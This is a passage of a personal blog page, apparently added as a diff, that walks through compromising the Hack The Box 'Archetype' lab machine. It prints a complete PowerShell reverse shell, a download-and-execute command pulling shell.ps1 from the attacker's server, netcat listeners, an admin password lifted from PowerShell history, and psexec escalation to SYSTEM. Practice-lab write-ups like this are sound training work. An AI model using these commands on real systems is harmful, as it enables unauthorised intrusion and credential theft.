+</span><span>SQL&gt; RECONFIGURE
+</span><span>SQL&gt; sp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;
+</span><span>[*] INFO(ARCHETYPE): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.
+</span><span>SQL&gt; RECONFIGURE
+</span><span>SQL&gt; xp_cmdshell &quot;whoami&quot;
+</span><span>output
+</span><span>
+</span><span>--------------------------------------------------------------------------------
+</span><span>
+</span><span>archetype\sql_svc
+</span><span>
+</span><span>NULL
+</span><span>
+</span><span>SQL&gt;
+</span></code></pre>
+<p>Now we have a command shell!  We can then turn this into a nicer shell.  Our python command from Passage unfortunately does not work;</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>SQL&gt; xp_cmdshell &quot;python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;&quot;
+</span><span>[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near &#39;import&#39;.
+</span></code></pre>
+<p>However, I searched online and found this, which will enumerate ports on the system (using powershell) so that we can get a reverse shell:</p>
+<pre data-lang="powershell" style="background-color:#282a36;color:#f8f8f2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span style="color:#ffffff;">$client </span><span style="color:#ff79c6;">= </span><span style="color:#8be9fd;">New-Object</span><span> System.Net.Sockets.TCPClient(</span><span style="color:#f1fa8c;">&quot;10.10.14.34&quot;</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">1234</span><span>);</span><span style="color:#ffffff;">$stream </span><span style="color:#ff79c6;">= </span><span style="color:#ffffff;">$client.GetStream</span><span>();[</span><span style="font-style:italic;color:#8be9fd;">byte</span><span>[]]</span><span style="color:#ffffff;">$bytes </span><span style="color:#ff79c6;">= </span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">..</span><span style="color:#bd93f9;">65535</span><span style="color:#ff79c6;">|%</span><span>{</span><span style="color:#bd93f9;">0</span><span>};</span><span style="color:#ff79c6;">while</span><span>((</span><span style="color:#ffffff;">$i </span><span style="color:#ff79c6;">= </span><span style="color:#ffffff;">$stream.Read</span><span>(</span><span style="color:#ffffff;">$bytes</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">, </span><span style="color:#ffffff;">$bytes.Length</span><span>)) </span><span style="color:#ff79c6;">-ne </span><span style="color:#bd93f9;">0</span><span>){;</span><span style="color:#ffffff;">$data </span><span style="color:#ff79c6;">= </span><span>(</span><span style="color:#8be9fd;">New-Object </span><span style="color:#ff79c6;">-</span><span>TypeName System.Text.ASCIIEncoding).GetString(</span><span style="color:#ffffff;">$bytes</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">, </span><span style="color:#ffffff;">$i</span><span>);</span><span style="color:#ffffff;">$sendback </span><span style="color:#ff79c6;">= </span><span>(iex </span><span style="color:#ffffff;">$data </span><span style="color:#ff79c6;">2&gt;&amp;1 | </span><span style="color:#8be9fd;">Out-String </span><span>);</span><span style="color:#ffffff;">$sendback2 </span><span style="color:#ff79c6;">= </span><span style="color:#ffffff;">$sendback </span><span style="color:#ff79c6;">+ </span><span style="color:#f1fa8c;">&quot;# &quot;</span><span>; </span><span style="color:#ffffff;">$sendbyte </span><span style="color:#ff79c6;">= </span><span>([</span><span style="font-style:italic;color:#8be9fd;">text.encoding</span><span>]::ASCII).GetBytes(</span><span style="color:#ffffff;">$sendback2</span><span>);</span><span style="color:#ffffff;">$stream.Write</span><span>(</span><span style="color:#ffffff;">$sendbyte</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">,</span><span style="color:#ffffff;">$sendbyte.Length</span><span>);</span><span style="color:#ffffff;">$stream.Flush</span><span>()};</span><span style="color:#ffffff;">$client.close</span><span>()
+</span></code></pre>
+<p>We need to change the IP address to your <code>tun0</code> one:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> ifconfig </span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">grep</span><span style="font-style:italic;color:#ffb86c;"> -A</span><span> 1 </span><span style="color:#f1fa8c;">&#39;tun0&#39; </span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">tail</span><span style="font-style:italic;color:#ffb86c;"> -1 </span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">grep</span><span style="font-style:italic;color:#ffb86c;"> -o -P </span><span style="color:#f1fa8c;">&#39;inet(.{0,15})&#39; </span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">grep</span><span style="font-style:italic;color:#ffb86c;"> -oE </span><span style="color:#f1fa8c;">&#39;((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])&#39;</span><span style="color:#ff79c6;">;
+</span><span style="color:#50fa7b;">10.10.14.34
+</span></code></pre>
+<p>And the port to the one you want to use (e.g., <code>1234</code>).</p>
+<p>To host this reverse shell file. we need to set up a mini server.  We do this by, on our machine, running a python command (be sure to do this in the same directory as your powershell reverse shell file!):</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> sudo python3</span><span style="font-style:italic;color:#ffb86c;"> -m</span><span> http.server 80
+</span><span style="color:#50fa7b;">[sudo]</span><span> password for jakeireland:
+</span><span style="color:#50fa7b;">Serving</span><span> HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) </span><span style="color:#50fa7b;">...
+</span></code></pre>
+<p>Now we run a netcat listener on the port specified in our reverse shell file above:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> nc</span><span style="font-style:italic;color:#ffb86c;"> -nvlp</span><span> 1234
+</span><span style="color:#50fa7b;">listening</span><span> on </span><span style="color:#ff79c6;">[</span><span>any</span><span style="color:#ff79c6;">]</span><span> 1234 ...
+</span></code></pre>
+<p>Now we need to upload our reverse shell file to the SQL database.  We found <a href="https://github.com/frizb/Windows-Privilege-Escalation#uploading-files-with-powershell">this</a> online for how to upload files, so we run the following:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>SQL&gt; xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.34/shell.ps1\&quot;);&quot;
+</span></code></pre>
+<p>We run this and see that our netcat listener picks up something!:</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>$ sudo rlwrap nc -nvlp 1234
+</span><span>listening on [any] 1234 ...
+</span><span>connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49710
+</span></code></pre>
+<p>In that window, we can now run</p>
+<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>$ sudo rlwrap nc -nlvp 1234
+</span><span>listening on [any] 1234 ...
+</span><span>connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49683
+</span><span>whoami
+</span><span>archetype\sql_svc
+</span><span>more \users\sql_svc\desktop\user.txt
+</span><span>3e7b************************21a3
+</span></code></pre>
+<p>Now we have the user flag!  But as far as I can tell, <code>archetype\sql_svc</code> is an ordinary user.  We need to escalate privileges.  I follow a good article <a href="https://github.com/frizb/Windows-Privilege-Escalation">here</a> on privilege escalation in Windows.  Here is some basic data about the user and the system:</p>
+<pre data-lang="powershell" style="background-color:#282a36;color:#f8f8f2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span>whoami
+</span><span>archetype\sql_svc
+</span><span>net user
+</span><span>
+</span><span>User accounts </span><span style="color:#ff79c6;">for</span><span> \\ARCHETYPE
+</span><span>
+</span><span style="color:#ff79c6;">-------------------------------------------------------------------------------
+</span><span>Administrator            DefaultAccount           Guest
+</span><span>sql_svc                  WDAGUtilityAccount
+</span><span>The command completed successfully.
+</span><span>
+</span><span>systeminfo
+</span><span>
+</span><span>Host Name:                 ARCHETYPE
+</span><span>OS Name:                   Microsoft Windows Server </span><span style="color:#bd93f9;">2019</span><span> Standard
+</span><span>OS Version:                </span><span style="color:#bd93f9;">10.0</span><span>.</span><span style="color:#bd93f9;">17763</span><span> N</span><span style="color:#ff79c6;">/</span><span>A Build </span><span style="color:#bd93f9;">17763
+</span><span>OS Manufacturer:           Microsoft Corporation
+</span><span>OS Configuration:          Standalone Server
+</span><span>OS Build Type:             Multiprocessor Free
+</span><span>Registered Owner:          Windows User
+</span><span>Registered Organization:
+</span><span>Product ID:                </span><span style="color:#bd93f9;">00429</span><span style="color:#ff79c6;">-</span><span style="color:#bd93f9;">00521</span><span style="color:#ff79c6;">-</span><span style="color:#bd93f9;">62775</span><span style="color:#ff79c6;">-</span><span>AA442
+</span><span>Original Install Date:     </span><span style="color:#bd93f9;">1</span><span style="color:#ff79c6;">/</span><span style="color:#bd93f9;">19</span><span style="color:#ff79c6;">/</span><span style="color:#bd93f9;">2020</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">11</span><span>:</span><span style="color:#bd93f9;">39</span><span>:</span><span style="color:#bd93f9;">36</span><span> PM
+</span><span>System Boot Time:          </span><span style="color:#bd93f9;">3</span><span style="color:#ff79c6;">/</span><span style="color:#bd93f9;">24</span><span style="color:#ff79c6;">/</span><span style="color:#bd93f9;">2021</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">8</span><span>:</span><span style="color:#bd93f9;">19</span><span>:</span><span style="color:#bd93f9;">01</span><span> PM
+</span><span>System Manufacturer:       VMware</span><span style="color:#ff79c6;">,</span><span> Inc.
+</span><span>System Model:              VMware7</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">1
+</span><span>System Type:               x64</span><span style="color:#ff79c6;">-</span><span>based PC
+</span><span>Processor(s):              </span><span style="color:#bd93f9;">1</span><span> Processor(s) Installed.
+</span><span>                           [</span><span style="color:#bd93f9;">01</span><span>]: AMD64 Family </span><span style="color:#bd93f9;">23</span><span> Model </span><span style="color:#bd93f9;">1</span><span> Stepping </span><span style="color:#bd93f9;">2</span><span> AuthenticAMD ~</span><span style="color:#bd93f9;">2000</span><span> Mhz
+</span><span>BIOS Version:              VMware</span><span style="color:#ff79c6;">,</span><span> Inc. VMW71.00V.</span><span style="color:#bd93f9;">13989454.</span><span>B64.</span><span style="color:#bd93f9;">1906190538</span><span style="color:#ff79c6;">, </span><span style="color:#bd93f9;">6</span><span style="color:#ff79c6;">/</span><span style="color:#bd93f9;">19</span><span style="color:#ff79c6;">/</span><span style="color:#bd93f9;">2019
+</span><span>Windows Directory:         C:\Windows
+</span><span>System Directory:          C:\Windows\system32
+</span><span>Boot Device:               \Device\HarddiskVolume2
+</span><span>System Locale:             en</span><span style="color:#ff79c6;">-</span><span>us;English (United States)
+</span><span>Input Locale:              en</span><span style="color:#ff79c6;">-</span><span>us;English (United States)
+</span><span>Time Zone:                 (UTC</span><span style="color:#ff79c6;">-</span><span style="color:#bd93f9;">08</span><span>:</span><span style="color:#bd93f9;">00</span><span>) Pacific Time (US </span><span style="color:#ff79c6;">&amp;</span><span> Canada)
+</span><span>Total Physical Memory:     </span><span style="color:#bd93f9;">2</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">047</span><span> MB
+</span><span>Available Physical Memory: </span><span style="color:#bd93f9;">983</span><span> MB
+</span><span>Virtual Memory: Max Size:  </span><span style="color:#bd93f9;">2</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">431</span><span> MB
+</span><span>Virtual Memory: Available: </span><span style="color:#bd93f9;">1</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">328</span><span> MB
+</span><span>Virtual Memory: </span><span style="color:#ff79c6;">In</span><span> Use:    </span><span style="color:#bd93f9;">1</span><span style="color:#ff79c6;">,</span><span style="color:#bd93f9;">103</span><span> MB
+</span><span>Page File Location(s):     C:\pagefile.sys
+</span><span>Domain:                    WORKGROUP
+</span><span>Logon Server:              N</span><span style="color:#ff79c6;">/</span><span>A
+</span><span>Hotfix(s):                 </span><span style="color:#bd93f9;">2</span><span> Hotfix(s) Installed.
+</span><span>                           [</span><span style="color:#bd93f9;">01</span><span>]: KB4532947
+</span><span>                           [</span><span style="color:#bd93f9;">02</span><span>]: KB4464455
+</span><span>Network Card(s):           </span><span style="color:#bd93f9;">1</span><span> NIC(s) Installed.
+</span><span>                           [</span><span style="color:#bd93f9;">01</span><span>]: vmxnet3 Ethernet Adapter
+</span><span>                                 Connection Name: Ethernet0 </span><span style="color:#bd93f9;">2
+</span><span>                                 DHCP Enabled:    No
+</span><span>                                 IP address(es)
+</span><span>                                 [</span><span style="color:#bd93f9;">01</span><span>]: </span><span style="color:#bd93f9;">10.10</span><span>.</span><span style="color:#bd93f9;">10.27
+</span><span>                                 [</span><span style="color:#bd93f9;">02</span><span>]: fe80::cc9b:ff1e:4d8a:e751
+</span><span>                                 [</span><span style="color:#bd93f9;">03</span><span>]: dead:beef::cc9b:ff1e:4d8a:e751
+</span><span>Hyper</span><span style="color:#ff79c6;">-</span><span>V Requirements:      A hypervisor has been detected. Features required </span><span style="color:#ff79c6;">for</span><span> Hyper</span><span style="color:#ff79c6;">-</span><span>V will not be displayed.
+</span><span>netconfig Workstation
+</span><span>net config Workstation
+</span><span>Computer name                        \\ARCHETYPE
+</span><span>Full Computer name                   Archetype
+</span><span>User name                            sql_svc
+</span><span>
+</span><span>Workstation active on
+</span><span>        NetBT_Tcpip_{F9786909</span><span style="color:#ff79c6;">-</span><span>146A</span><span style="color:#ff79c6;">-</span><span style="color:#bd93f9;">4450</span><span style="color:#ff79c6;">-</span><span>84CE</span><span style="color:#ff79c6;">-</span><span>B06994DB4499} (005056B90510)
+</span><span>
+</span><span>Software version                     Windows Server </span><span style="color:#bd93f9;">2019</span><span> Standard
+</span><span>
+</span><span>Workstation domain                   WORKGROUP
+</span><span>Logon domain                         ARCHETYPE
+</span><span>
+</span><span>COM Open Timeout (sec)               </span><span style="color:#bd93f9;">0
+</span><span>COM Send Count (byte)                </span><span style="color:#bd93f9;">16
+</span><span>COM Send Timeout (msec)              </span><span style="color:#bd93f9;">250
+</span><span>The command completed successfully.
+</span><span>
+</span><span>net users
+</span><span>
+</span><span>User accounts </span><span style="color:#ff79c6;">for</span><span> \\ARCHETYPE
+</span><span>
+</span><span style="color:#ff79c6;">-------------------------------------------------------------------------------
+</span><span>Administrator            DefaultAccount           Guest
+</span><span>sql_svc                  WDAGUtilityAccount
+</span><span>The command completed successfully.
+</span></code></pre>
+<p>But in fact, I found another excellent-looking article <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#powershell-history">here</a> describing some more privilege escalation.  I try running:</p>
+<pre data-lang="powershell" style="background-color:#282a36;color:#f8f8f2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</span><span style="color:#8be9fd;">net.exe</span><span> use T: \\Archetype\backups </span><span style="color:#ff79c6;">/</span><span>user:administrator MEGACORP_4dm1n</span><span style="color:#ff79c6;">!!
+</span><span style="color:#ff79c6;">exit
+</span></code></pre>
+<p>So it looks like there is a user called <code>administrator</code> with potentially a password there: <code>MEGACORP_4dm1in!!</code>...  Given this, it looks like <code>backups</code> has been mapped using the local admin credentials.</p>
+<p>Let's try logging into the system again, using another one of Impacket's tools: <code>psexec.py</code>;</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> python3 git-workspace/impacket/examples/psexec.py administrator@archetype
+</span><span style="color:#50fa7b;">Impacket</span><span> v0.9.22 - Copyright 2020 SecureAuth Corporation
+</span><span>
+</span><span style="color:#50fa7b;">Password:
+</span><span style="color:#50fa7b;">[*]</span><span> Requesting shares on archetype.....
+</span><span style="color:#50fa7b;">[*]</span><span> Found writable share ADMIN$
+</span><span style="color:#50fa7b;">[*]</span><span> Uploading file NxYETPZE.exe
+</span><span style="color:#50fa7b;">[*]</span><span> Opening SVCManager on archetype.....
+</span><span style="color:#50fa7b;">[*]</span><span> Creating service bzkq on archetype.....
+</span><span style="color:#50fa7b;">[*]</span><span> Starting service bzkq.....
+</span><span style="color:#50fa7b;">[!]</span><span> Press help for extra shell commands
+</span><span style="color:#50fa7b;">Microsoft</span><span> Windows </span><span style="color:#ff79c6;">[</span><span>Version 10.0.17763.107</span><span style="color:#ff79c6;">]
+</span><span>(</span><span style="color:#50fa7b;">c</span><span>) 2018 Microsoft Corporation. All rights reserved.
+</span><span>
+</span><span style="color:#50fa7b;">C:</span><span style="color:#ff79c6;">\W</span><span style="color:#50fa7b;">indows</span><span style="color:#ff79c6;">\s</span><span style="color:#50fa7b;">ystem32</span><span style="color:#ff79c6;">&gt;
+</span></code></pre>
+<p>And it looks like we are now accessing the root user!!</p>
+<p>We go to their desktop and find the root flag.  Hurrah!</p>
+<pre data-lang="powershell" style="background-color:#282a36;color:#f8f8f2;" class="language-powershell "><code class="language-powershell" data-lang="powershell"><span>C:\Windows\system3</span><span style="color:#ff79c6;">2&gt;</span><span>more \users\administrator\desktop\root.txt
+</span><span>b91c</span><span style="color:#ff79c6;">************************</span><span style="color:#bd93f9;">8528
+</span></code></pre>
+<br>
+<hr />
+<br>
+<h1 id="notes">Notes</h1>
+<p>I must admit, I know this is supposed to be the easiest one, made even by the person who created HTB (I believe), but without an HTTP server I must admit I struggled a bit, as I had only experience with HTTP servers.  And naturally, it's always a bit of a struggle to escalate privileges, as there are some pretty niche footholds to do so out there...  And a lot.  Either way, this was a fun experience.</p>
+
+</article>
+
+<section class="pagination">
+	<a href="https://jakewilliami.github.io/htb-oopsie/" class="left arrow">&#8592;</a>
+	<a href="#" class="top">Top</a>
+	<a href="https://jakewilliami.github.io/perfect-powers/" class="right arrow">&#8594;</a>
+</section>
+
+  </main>
+
+  <footer>
+
+  <span class="copyright">
+    &copy; 2020&ndash;2024 Jake W. Ireland. Powered by <a href="https://www.getzola.org">Zola</a> and <a href="https://github.com/semanticdata/mabuya">Mabuya</a>/<a href="https://github.com/aaranxu/tale-zola">Tale</a>; inspired by <a href="https://github.com/nielsenramon/chalk">Chalk</a>.
+  </span>
+
+  <nav class="navigation-footer">
+    <ul>
+      <li><a href="https://github.com/jakewilliami">GitHub</a></li>
+      <li><a href="https://twitter.com/JakeWIreland">Twitter</a></li>
+      <li><a href="https://www.linkedin.com/in/jake-ireland-nz/">LinkedIn</a></li>
+    </ul>
+  </nav>
+
+</footer>
+
+</body>
+
+</html>
